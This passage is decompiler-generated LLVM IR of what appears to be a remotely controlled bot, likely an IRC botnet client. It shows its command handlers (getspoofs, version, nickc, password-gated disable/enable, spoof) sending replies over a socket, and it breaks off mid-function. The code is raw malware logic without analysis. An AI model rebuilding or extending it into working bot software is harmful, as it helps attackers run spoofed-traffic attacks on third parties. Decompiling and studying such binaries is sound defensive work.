  %v3_8048c73 = load i32, i32* %v2_8048c73, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c76 = icmp eq i32 %v3_8048c73, 0
  br i1 %v1_8048c76, label %dec_label_pc_8048cc5, label %dec_label_pc_8048c7a

dec_label_pc_8048c7a:                             ; preds = %dec_label_pc_8048c6a
  %v3_8048c7d = load i32, i32* %v2_8048c7d, align 4
  store i32 %v3_8048c7d, i32* @edx, align 4
  %v3_8048c83 = load i32, i32* %v2_8048c83, align 4
  %v7_8048c86 = icmp ult i32 %v3_8048c7d, %v3_8048c83
  store i1 %v7_8048c86, i1* %cf.global-to-local, align 1
  %v1_8048c88 = icmp eq i1 %v7_8048c86, false
  br i1 %v1_8048c88, label %dec_label_pc_8048ca5, label %dec_label_pc_8048c8a

dec_label_pc_8048c8a:                             ; preds = %dec_label_pc_8048c7a
  %v3_8048c8d = load i32, i32* %v2_8048c7d, align 4
  store i32 %v3_8048c8d, i32* %edx.global-to-local, align 4
  %v0_8048c93 = load i32, i32* @ebp, align 4
  %v2_8048c93 = add i32 %storemerge12.in111, -5188
  %v3_8048c93 = add i32 %v2_8048c93, %v0_8048c93
  %v4_8048c93 = inttoptr i32 %v3_8048c93 to i8*
  %v5_8048c93 = load i8, i8* %v4_8048c93, align 1
  %v3_8048c9a = inttoptr i32 %v3_8048c8d to i8*
  store i8 %v5_8048c93, i8* %v3_8048c9a, align 1
  %v0_8048c9c = load i32, i32* %edx.global-to-local, align 4
  %v1_8048c9c = add i32 %v0_8048c9c, 1
  store i32 %v1_8048c9c, i32* @edx, align 4
  store i32 %v1_8048c9c, i32* %v2_8048c7d, align 4
  br label %dec_label_pc_8048ce3

dec_label_pc_8048ca5:                             ; preds = %dec_label_pc_8048c7a
  %v0_8048ca8 = load i32, i32* @ebp, align 4
  %v2_8048ca8 = add i32 %storemerge12.in111, -5188
  %v3_8048ca8 = add i32 %v2_8048ca8, %v0_8048ca8
  %v4_8048ca8 = inttoptr i32 %v3_8048ca8 to i8*
  %v5_8048ca8 = load i8, i8* %v4_8048ca8, align 1
  %v0_8048cb4 = load i32, i32* @esp, align 4
  %v5_8048cb4 = icmp ult i32 %v0_8048cb4, 8
  store i1 %v5_8048cb4, i1* %cf.global-to-local, align 1
  %v4_8048cbb = call i32 @putc_unlocked(i8 %v5_8048ca8, i32 %v3_8048bc0)
  %v0_8048cc0 = load i32, i32* @esp, align 4
  %v2_8048cc0 = icmp ugt i32 %v0_8048cc0, -17
  store i1 %v2_8048cc0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048ce3

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c6a
  %v0_8048cc8 = load i32, i32* @ebp, align 4
  %v2_8048cc8 = add i32 %storemerge12.in111, -5188
  %v3_8048cc8 = add i32 %v2_8048cc8, %v0_8048cc8
  %v4_8048cc8 = inttoptr i32 %v3_8048cc8 to i8*
  %v5_8048cc8 = load i8, i8* %v4_8048cc8, align 1
  %v0_8048cd4 = load i32, i32* @esp, align 4
  %v5_8048cd4 = icmp ult i32 %v0_8048cd4, 8
  store i1 %v5_8048cd4, i1* %cf.global-to-local, align 1
  %v4_8048cdb = call i32 @__GI_fputc(i8 %v5_8048cc8, i32 %v3_8048bc0)
  %v0_8048ce0 = load i32, i32* @esp, align 4
  %v2_8048ce0 = icmp ugt i32 %v0_8048ce0, -17
  store i1 %v2_8048ce0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048ce3

dec_label_pc_8048ce3:                             ; preds = %dec_label_pc_8048ca5, %dec_label_pc_8048c8a, %dec_label_pc_8048cc5
  %v4_8048ce3 = add i32 %storemerge12.in111, 1
  %v10_8048ce9 = icmp ult i32 %v4_8048ce3, %v5_8048bdc124
  store i1 %v10_8048ce9, i1* %cf.global-to-local, align 1
  %exitcond129 = icmp eq i32 %v4_8048ce3, %v5_8048bdc124
  br i1 %exitcond129, label %dec_label_pc_8048d08, label %dec_label_pc_8048c6a

dec_label_pc_8048cf4:                             ; preds = %dec_label_pc_8048c11
  %v4_8048cf4 = add nuw nsw i32 %storemerge6120, 1
  %v10_8048cfa = icmp ult i32 %v4_8048cf4, %v5_8048bdc124
  store i1 %v10_8048cfa, i1* %cf.global-to-local, align 1
  %v5_8048cfd = icmp slt i32 %v4_8048cf4, %v5_8048bdc124
  br i1 %v5_8048cfd, label %dec_label_pc_8048c11, label %dec_label_pc_8048bcb.loopexit

dec_label_pc_8048d08.loopexit16:                  ; preds = %dec_label_pc_8048bcb.loopexit, %dec_label_pc_8048b71
  %.pre30 = add i32 %v3_8048bc0, 52
  %.pre31 = inttoptr i32 %.pre30 to i32*
  %.pre33 = add i32 %v3_8048bc0, 16
  %.pre34 = inttoptr i32 %.pre33 to i32*
  %.pre35 = add i32 %v3_8048bc0, 28
  %.pre36 = inttoptr i32 %.pre35 to i32*
  br label %dec_label_pc_8048d08

dec_label_pc_8048d08:                             ; preds = %dec_label_pc_8048c64, %dec_label_pc_8048ce3, %dec_label_pc_8048d08.loopexit16
  %v2_8048d80.pre-phi = phi i32* [ %.pre36, %dec_label_pc_8048d08.loopexit16 ], [ %v2_8048c83, %dec_label_pc_8048ce3 ], [ %v2_8048c83, %dec_label_pc_8048c64 ]
  %v2_8048d7a.pre-phi = phi i32* [ %.pre34, %dec_label_pc_8048d08.loopexit16 ], [ %v2_8048c7d, %dec_label_pc_8048ce3 ], [ %v2_8048c7d, %dec_label_pc_8048c64 ]
  %v2_8048d70.pre-phi = phi i32* [ %.pre31, %dec_label_pc_8048d08.loopexit16 ], [ %v2_8048c73, %dec_label_pc_8048ce3 ], [ %v2_8048c73, %dec_label_pc_8048c64 ]
  store i1 %v5_8048bb2, i1* %cf.global-to-local, align 1
  %v3_8048d1c = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_805a548.47 to i32))
  %v0_8048d21 = load i32, i32* @esp, align 4
  %v2_8048d21 = icmp ugt i32 %v0_8048d21, -17
  store i1 %v2_8048d21, i1* %cf.global-to-local, align 1
  %v5_8048d3599 = call i32 @recv(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp85101 = icmp slt i32 %v5_8048d3599, 1
  br i1 %tmp85101, label %dec_label_pc_8048df4, label %dec_label_pc_8048d4a

dec_label_pc_8048d24.loopexit:                    ; preds = %dec_label_pc_8048de0
  %v5_8048d35 = call i32 @recv(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp85 = icmp slt i32 %v5_8048d35, 1
  br i1 %tmp85, label %dec_label_pc_8048df4, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d08, %dec_label_pc_8048d24.loopexit
  %v5_8048d35102 = phi i32 [ %v5_8048d35, %dec_label_pc_8048d24.loopexit ], [ %v5_8048d3599, %dec_label_pc_8048d08 ]
  %v4_8048d4a = add i32 %v5_8048d35102, -4095
  %v8_8048d4a = icmp ult i32 %v5_8048d35102, 4095
  %v9_8048d4a = sub i32 4094, %v5_8048d35102
  %v10_8048d4a = and i32 %v9_8048d4a, %v5_8048d35102
  %v11_8048d4a = icmp slt i32 %v10_8048d4a, 0
  store i1 %v8_8048d4a, i1* %cf.global-to-local, align 1
  %v12_8048d4a = icmp eq i32 %v4_8048d4a, 0
  %v13_8048d4a = icmp slt i32 %v4_8048d4a, 0
  %v3_8048d51 = icmp eq i1 %v13_8048d4a, %v11_8048d4a
  %v4_8048d51 = icmp eq i1 %v12_8048d4a, false
  %v5_8048d51 = and i1 %v4_8048d51, %v3_8048d51
  br i1 %v5_8048d51, label %dec_label_pc_8048d67.lr.ph, label %dec_label_pc_8048d53

dec_label_pc_8048d53:                             ; preds = %dec_label_pc_8048d4a
  %v0_8048d56 = load i32, i32* @ebp, align 4
  %v2_8048d56 = add i32 %v5_8048d35102, -5188
  %v3_8048d56 = add i32 %v2_8048d56, %v0_8048d56
  %v4_8048d56 = inttoptr i32 %v3_8048d56 to i8*
  store i8 0, i8* %v4_8048d56, align 1
  br label %dec_label_pc_8048d67.lr.ph

dec_label_pc_8048d67.lr.ph:                       ; preds = %dec_label_pc_8048d53, %dec_label_pc_8048d4a
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d67

dec_label_pc_8048d67:                             ; preds = %dec_label_pc_8048de0, %dec_label_pc_8048d67.lr.ph
  %storemerge498 = phi i32 [ 0, %dec_label_pc_8048d67.lr.ph ], [ %v4_8048de0, %dec_label_pc_8048de0 ]
  %v3_8048d70 = load i32, i32* %v2_8048d70.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d73 = icmp eq i32 %v3_8048d70, 0
  br i1 %v1_8048d73, label %dec_label_pc_8048dc2, label %dec_label_pc_8048d77

dec_label_pc_8048d77:                             ; preds = %dec_label_pc_8048d67
  %v3_8048d7a = load i32, i32* %v2_8048d7a.pre-phi, align 4
  store i32 %v3_8048d7a, i32* @edx, align 4
  %v3_8048d80 = load i32, i32* %v2_8048d80.pre-phi, align 4
  %v7_8048d83 = icmp ult i32 %v3_8048d7a, %v3_8048d80
  store i1 %v7_8048d83, i1* %cf.global-to-local, align 1
  %v1_8048d85 = icmp eq i1 %v7_8048d83, false
  br i1 %v1_8048d85, label %dec_label_pc_8048da2, label %dec_label_pc_8048d87

dec_label_pc_8048d87:                             ; preds = %dec_label_pc_8048d77
  %v3_8048d8a = load i32, i32* %v2_8048d7a.pre-phi, align 4
  store i32 %v3_8048d8a, i32* %edx.global-to-local, align 4
  %v0_8048d90 = load i32, i32* @ebp, align 4
  %v2_8048d90 = add nsw i32 %storemerge498, -5188
  %v3_8048d90 = add i32 %v2_8048d90, %v0_8048d90
  %v4_8048d90 = inttoptr i32 %v3_8048d90 to i8*
  %v5_8048d90 = load i8, i8* %v4_8048d90, align 1
  %v3_8048d97 = inttoptr i32 %v3_8048d8a to i8*
  store i8 %v5_8048d90, i8* %v3_8048d97, align 1
  %v0_8048d99 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048d99 = add i32 %v0_8048d99, 1
  store i32 %v1_8048d99, i32* @edx, align 4
  store i32 %v1_8048d99, i32* %v2_8048d7a.pre-phi, align 4
  br label %dec_label_pc_8048de0

dec_label_pc_8048da2:                             ; preds = %dec_label_pc_8048d77
  %v0_8048da5 = load i32, i32* @ebp, align 4
  %v2_8048da5 = add nsw i32 %storemerge498, -5188
  %v3_8048da5 = add i32 %v2_8048da5, %v0_8048da5
  %v4_8048da5 = inttoptr i32 %v3_8048da5 to i8*
  %v5_8048da5 = load i8, i8* %v4_8048da5, align 1
  %v0_8048db1 = load i32, i32* @esp, align 4
  %v5_8048db1 = icmp ult i32 %v0_8048db1, 8
  store i1 %v5_8048db1, i1* %cf.global-to-local, align 1
  %v4_8048db8 = call i32 @putc_unlocked(i8 %v5_8048da5, i32 %v3_8048bc0)
  %v0_8048dbd = load i32, i32* @esp, align 4
  %v2_8048dbd = icmp ugt i32 %v0_8048dbd, -17
  store i1 %v2_8048dbd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048de0

dec_label_pc_8048dc2:                             ; preds = %dec_label_pc_8048d67
  %v0_8048dc5 = load i32, i32* @ebp, align 4
  %v2_8048dc5 = add nsw i32 %storemerge498, -5188
  %v3_8048dc5 = add i32 %v2_8048dc5, %v0_8048dc5
  %v4_8048dc5 = inttoptr i32 %v3_8048dc5 to i8*
  %v5_8048dc5 = load i8, i8* %v4_8048dc5, align 1
  %v0_8048dd1 = load i32, i32* @esp, align 4
  %v5_8048dd1 = icmp ult i32 %v0_8048dd1, 8
  store i1 %v5_8048dd1, i1* %cf.global-to-local, align 1
  %v4_8048dd8 = call i32 @__GI_fputc(i8 %v5_8048dc5, i32 %v3_8048bc0)
  %v0_8048ddd = load i32, i32* @esp, align 4
  %v2_8048ddd = icmp ugt i32 %v0_8048ddd, -17
  store i1 %v2_8048ddd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048de0

dec_label_pc_8048de0:                             ; preds = %dec_label_pc_8048da2, %dec_label_pc_8048d87, %dec_label_pc_8048dc2
  %v4_8048de0 = add nuw nsw i32 %storemerge498, 1
  %v10_8048de6 = icmp ult i32 %v4_8048de0, %v5_8048d35102
  store i1 %v10_8048de6, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8048de0, %v5_8048d35102
  br i1 %exitcond, label %dec_label_pc_8048d24.loopexit, label %dec_label_pc_8048d67

dec_label_pc_8048df4:                             ; preds = %dec_label_pc_8048d24.loopexit, %dec_label_pc_8048d08
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  %v1_8048dfa = inttoptr i32 %v3_8048bc0 to i16*
  %v2_8048dfa = call i32 @__GI_fclose(i16* %v1_8048dfa)
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  %v1_8048e08 = call i32 @close(i32 %v4_8048991)
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  %v1_8048e15 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048e1a

dec_label_pc_8048e1a:                             ; preds = %entry, %dec_label_pc_8048df4
  %v0_8048e20 = phi i32 [ %v1_8048952, %entry ], [ %v1_8048e15, %dec_label_pc_8048df4 ]
  ret i32 %v0_8048e20

; uselistorder directives
  uselistorder i32 %storemerge498, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8048d4a, { 1, 0 }
  uselistorder i32 %v5_8048d35102, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_8048d7a.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8048cf4, { 1, 0, 2 }
  uselistorder i32 %v4_8048ce3, { 1, 2, 0 }
  uselistorder i32 %storemerge12.in111, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8048c4d, { 1, 0 }
  uselistorder i32 %v7_8048c4b, { 1, 0 }
  uselistorder i32 %storemerge6120, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8048bf1, { 1, 0 }
  uselistorder i32 %v5_8048bdc124, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8048bd2, { 3, 1, 5, 2, 4, 0 }
  uselistorder i32 %v3_8048bc0, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %v1_8048ab5, { 1, 0, 2 }
  uselistorder i32 %storemerge7, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8048a56.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i1 %v0_80489f9, { 1, 0 }
  uselistorder i32 %v4_8048991, { 3, 4, 2, 5, 1, 6, 7, 0, 8 }
  uselistorder i32 %v4_8048962, { 1, 0 }
  uselistorder i1 %v5_804894c, { 6, 7, 1, 5, 4, 0, 8, 3, 2, 9 }
  uselistorder i32 %v12_8048946, { 1, 0 }
  uselistorder i32* %stack_var_-5228, { 0, 5, 1, 2, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i1* %cf.global-to-local, { 3, 4, 5, 12, 6, 7, 8, 9, 10, 11, 64, 13, 14, 63, 15, 16, 27, 23, 17, 18, 19, 20, 21, 22, 0, 24, 25, 26, 1, 28, 29, 2, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32 -1092, { 1, 0 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048e1a, { 1, 0 }
  uselistorder label %dec_label_pc_8048de0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048d4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048d08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ce3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048c6a, { 1, 0 }
  uselistorder label %dec_label_pc_8048c11, { 1, 0 }
  uselistorder label %dec_label_pc_8048bf1, { 1, 0 }
  uselistorder label %dec_label_pc_8048b71, { 1, 0 }
  uselistorder label %dec_label_pc_8048b26, { 1, 0 }
  uselistorder label %dec_label_pc_8048b01, { 1, 0 }
  uselistorder label %dec_label_pc_8048a53, { 1, 0 }
  uselistorder label %dec_label_pc_8048a47, { 1, 0 }
  uselistorder label %dec_label_pc_80489c2, { 1, 0 }
  uselistorder label %dec_label_pc_8048988, { 1, 0 }
}

define i32 @getspoofs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp32 = call i8 @__decompiler_undefined_function_5()
  %tmp33 = call i8 @__decompiler_undefined_function_5()
  %tmp46 = call i8 @__decompiler_undefined_function_5()
  %v0_8048e32 = load i64, i64* @global_var_8062a8c.33, align 8
  %v1_8048e32 = trunc i64 %v0_8048e32 to i32
  %v9_8048e49 = icmp eq i32 %v1_8048e32, 1
  %v1_8048e4c = icmp eq i1 %v9_8048e49, false
  br i1 %v1_8048e4c, label %dec_label_pc_8048ea2, label %dec_label_pc_8048e4e

dec_label_pc_8048e4e:                             ; preds = %entry
  %v3_8048e5e16 = zext i8 %tmp46 to i32
  store i32 %v3_8048e5e16, i32* @ebx, align 4
  %v3_8048e95 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_805a560.48 to i32))
  br label %dec_label_pc_8048f4a

dec_label_pc_8048ea2:                             ; preds = %entry
  %v0_8048e2a = load i8*, i8** @global_var_8062a88.32, align 4
  %v1_8048e2a = ptrtoint i8* %v0_8048e2a to i32
  %v3_8048ec121 = zext i8 %tmp33 to i32
  store i32 %v3_8048ec121, i32* @ebx, align 4
  %v4_8048ed5 = zext i8 %tmp32 to i32
  store i32 %v4_8048ed5, i32* @esi, align 4
  %v1_8048eea = urem i32 %v1_8048e2a, 256
  store i32 %v1_8048eea, i32* @edi, align 4
  %v3_8048f42 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_805a580.49 to i32))
  br label %dec_label_pc_8048f4a

dec_label_pc_8048f4a:                             ; preds = %dec_label_pc_8048e4e, %dec_label_pc_8048ea2
  %v0_8048f51 = phi i32 [ %v3_8048f42, %dec_label_pc_8048ea2 ], [ %v3_8048e95, %dec_label_pc_8048e4e ]
  ret i32 %v0_8048f51

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048f4a, { 1, 0 }
}

define i32 @version(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8048f66 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_805a5ae.50 to i32))
  ret i32 %v3_8048f66
}

define i32 @nickc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_8048f77 = icmp eq i32 %arg3, 1
  br i1 %v12_8048f77, label %dec_label_pc_8048f95, label %dec_label_pc_8048f7d

dec_label_pc_8048f7d:                             ; preds = %entry
  %v3_8048f8b = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_805a5cb.51 to i32))
  br label %dec_label_pc_8048feb

dec_label_pc_8048f95:                             ; preds = %entry
  %v1_8048f98 = add i32 %arg4, 4
  %v1_8048f9b = inttoptr i32 %v1_8048f98 to i32*
  %v2_8048f9b = load i32, i32* %v1_8048f9b, align 4
  store i1 false, i1* @df, align 1
  %v4_8048fa8 = inttoptr i32 %v2_8048f9b to i8*
  store i32 %v2_8048f9b, i32* @edi, align 4
  %v3_8048fab = call i32 @_strlen(i8* %v4_8048fa8)
  %v4_8048fab = mul i32 %v3_8048fab, -1
  %v1_8048fb1 = sub i32 0, %v4_8048fab
  %v5_8048fb2 = icmp ult i32 %v1_8048fb1, 9
  %v9_8048fb2 = icmp eq i32 %v4_8048fab, -9
  %v2_8048fb5 = or i1 %v5_8048fb2, %v9_8048fb2
  br i1 %v2_8048fb5, label %dec_label_pc_8048fcf, label %dec_label_pc_8048fb7

dec_label_pc_8048fb7:                             ; preds = %dec_label_pc_8048f95
  %v3_8048fc5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_805a5e4.52 to i32))
  br label %dec_label_pc_8048feb

dec_label_pc_8048fcf:                             ; preds = %dec_label_pc_8048f95
  %v3_8048fe3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_805a619.53 to i32))
  br label %dec_label_pc_8048feb

dec_label_pc_8048feb:                             ; preds = %dec_label_pc_8048fb7, %dec_label_pc_8048f7d, %dec_label_pc_8048fcf
  %v0_8048fef = phi i32 [ %v3_8048fc5, %dec_label_pc_8048fb7 ], [ %v3_8048f8b, %dec_label_pc_8048f7d ], [ %v3_8048fe3, %dec_label_pc_8048fcf ]
  ret i32 %v0_8048fef

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048feb, { 2, 0, 1 }
}

define i32 @disable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_8048ff7 = icmp eq i32 %arg3, 1
  br i1 %v12_8048ff7, label %dec_label_pc_8049047, label %dec_label_pc_8048ffd

dec_label_pc_8048ffd:                             ; preds = %entry
  %v3_804900b = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_805a622.54 to i32))
  %v3_804903a = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_805a664.57 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_8049047:                             ; preds = %entry
  %v0_8049047 = load i8, i8* @global_var_8062a84.27, align 4
  %v4_804904c = icmp eq i8 %v0_8049047, 0
  br i1 %v4_804904c, label %dec_label_pc_804906b, label %dec_label_pc_8049050

dec_label_pc_8049050:                             ; preds = %dec_label_pc_8049047
  %v3_804905e = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_805a687.58 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_804906b:                             ; preds = %dec_label_pc_8049047
  %v1_804906e = add i32 %arg4, 4
  %v1_8049071 = inttoptr i32 %v1_804906e to i32*
  %v2_8049071 = load i32, i32* %v1_8049071, align 4
  store i1 false, i1* @df, align 1
  %v4_804907e = inttoptr i32 %v2_8049071 to i8*
  store i32 %v2_8049071, i32* @edi, align 4
  %v3_8049081 = call i32 @_strlen(i8* %v4_804907e)
  %v4_8049081 = mul i32 %v3_8049081, -1
  %v1_8049087 = sub i32 0, %v4_8049081
  %v5_8049088 = icmp ult i32 %v1_8049087, 254
  %v9_8049088 = icmp eq i32 %v4_8049081, -254
  %v2_804908d = or i1 %v5_8049088, %v9_8049088
  br i1 %v2_804908d, label %dec_label_pc_80490a7, label %dec_label_pc_804908f

dec_label_pc_804908f:                             ; preds = %dec_label_pc_804906b
  %v3_804909d = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_805a6a8.59 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_80490a7:                             ; preds = %dec_label_pc_804906b
  store i8 1, i8* @global_var_8062a84.27, align 4
  %v5_80490bf = call i32 @__GI_memset(i8* bitcast (i32* @global_var_8067420.60 to i8*), i32 0, i32 256)
  %v2_80490cd = load i32, i32* %v1_8049071, align 4
  store i32 %v2_80490cd, i32* @eax, align 4
  %v4_80490d8 = call i32 @strcpy(i8* bitcast (i32* @global_var_8067420.60 to i8*), i32 %v2_80490cd)
  %v3_80490eb = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_805a6d0.61 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_80490f3:                             ; preds = %dec_label_pc_804908f, %dec_label_pc_8049050, %dec_label_pc_8048ffd, %dec_label_pc_80490a7
  %v0_80490f7 = phi i32 [ %v3_804909d, %dec_label_pc_804908f ], [ %v3_804905e, %dec_label_pc_8049050 ], [ %v3_804903a, %dec_label_pc_8048ffd ], [ %v3_80490eb, %dec_label_pc_80490a7 ]
  ret i32 %v0_80490f7

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80490f3, { 3, 0, 1, 2 }
}

define i32 @enable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_80490fe = icmp eq i32 %arg3, 1
  br i1 %v12_80490fe, label %dec_label_pc_804914b, label %dec_label_pc_8049104

dec_label_pc_8049104:                             ; preds = %entry
  %v3_8049112 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_805a6ef.62 to i32))
  %v3_8049141 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_805a664.57 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_804914b:                             ; preds = %entry
  %v0_804914b = load i8, i8* @global_var_8062a84.27, align 4
  %v4_8049150 = icmp eq i8 %v0_804914b, 0
  %v1_8049152 = icmp eq i1 %v4_8049150, false
  br i1 %v1_8049152, label %dec_label_pc_804916c, label %dec_label_pc_8049154

dec_label_pc_8049154:                             ; preds = %dec_label_pc_804914b
  %v3_8049162 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_805a709.63 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_804916c:                             ; preds = %dec_label_pc_804914b
  %v1_804916f = add i32 %arg4, 4
  %v1_8049172 = inttoptr i32 %v1_804916f to i32*
  %v2_8049172 = load i32, i32* %v1_8049172, align 4
  %v4_804917d = call i32 @__GI_strcasecmp(i8* bitcast (i32* @global_var_8067420.60 to i8*), i32 %v2_8049172)
  %v1_8049185 = icmp eq i32 %v4_804917d, 0
  br i1 %v1_8049185, label %dec_label_pc_80491a1, label %dec_label_pc_8049189

dec_label_pc_8049189:                             ; preds = %dec_label_pc_804916c
  %v3_8049197 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_805a726.64 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_80491a1:                             ; preds = %dec_label_pc_804916c
  store i8 0, i8* @global_var_8062a84.27, align 4
  %v3_80491b6 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_805a741.65 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_80491be:                             ; preds = %dec_label_pc_8049189, %dec_label_pc_8049154, %dec_label_pc_8049104, %dec_label_pc_80491a1
  %v0_80491bf = phi i32 [ %v3_8049197, %dec_label_pc_8049189 ], [ %v3_8049162, %dec_label_pc_8049154 ], [ %v3_8049141, %dec_label_pc_8049104 ], [ %v3_80491b6, %dec_label_pc_80491a1 ]
  ret i32 %v0_80491bf

; uselistorder directives
  uselistorder i8* bitcast (i32* @global_var_8067420.60 to i8*), { 1, 2, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80491be, { 3, 0, 1, 2 }
}

define i32 @spoof(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %v12_80491ca = icmp eq i32 %arg3, 1
  br i1 %v12_80491ca, label %dec_label_pc_80491ff, label %dec_label_pc_80491d0

dec_label_pc_80491d0:                             ; preds = %entry
  %v3_80491de = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_805a760.66 to i32))
  store i32 %v3_80491de, i32* %eax.global-to-local, align 4
  store i8* null, i8** @global_var_8062a88.32, align 8
  store i64 0, i64* @global_var_8062a8c.33, align 8
  br label %dec_label_pc_8049396

dec_label_pc_80491ff:                             ; preds = %entry
  %v1_8049202 = add i32 %arg4, 4
  store i32 %v1_8049202, i32* %eax.global-to-local, align 4
  %v1_8049205 = inttoptr i32 %v1_8049202 to i32*
  %v2_8049205 = load i32, i32* %v1_8049205, align 4
  %v1_8049212 = and i32 %v2_8049205, -256
  store i32 %v1_8049212, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8049215 = inttoptr i32 %v2_8049205 to i8*
  store i32 %v2_8049205, i32* @edi, align 4
  %v3_804921b = call i32 @_strlen(i8* %v4_8049215)
  %v4_804921b = mul i32 %v3_804921b, -1
  %v1_8049221 = sub i32 0, %v4_804921b
  store i32 %v1_8049221, i32* %eax.global-to-local, align 4
  %v2_8049222 = icmp ult i32 %v1_8049221, 16
  %v6_8049222 = icmp eq i32 %v4_804921b, -16
  %v2_8049225 = or i1 %v2_8049222, %v6_8049222
  br i1 %v2_8049225, label %dec_label_pc_8049242, label %dec_label_pc_8049227

dec_label_pc_8049227:                             ; preds = %dec_label_pc_80491ff
  %v3_8049235 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_805a780.67 to i32))
  store i32 %v3_8049235, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049396

dec_label_pc_8049242:                             ; preds = %dec_label_pc_80491ff
  store i32 %v1_8049202, i32* %eax.global-to-local, align 4
  %v2_8049248 = load i32, i32* %v1_8049205, align 4
  %v2_804924e = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_804924e, i32* @eax, align 4
  %v3_8049255 = bitcast i32* %stack_var_-276 to i8*
  %v4_8049255 = call i32 @strcpy(i8* %v3_8049255, i32 %v2_8049248)
  %v2_804926e = ptrtoint i32* %stack_var_-512 to i32
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
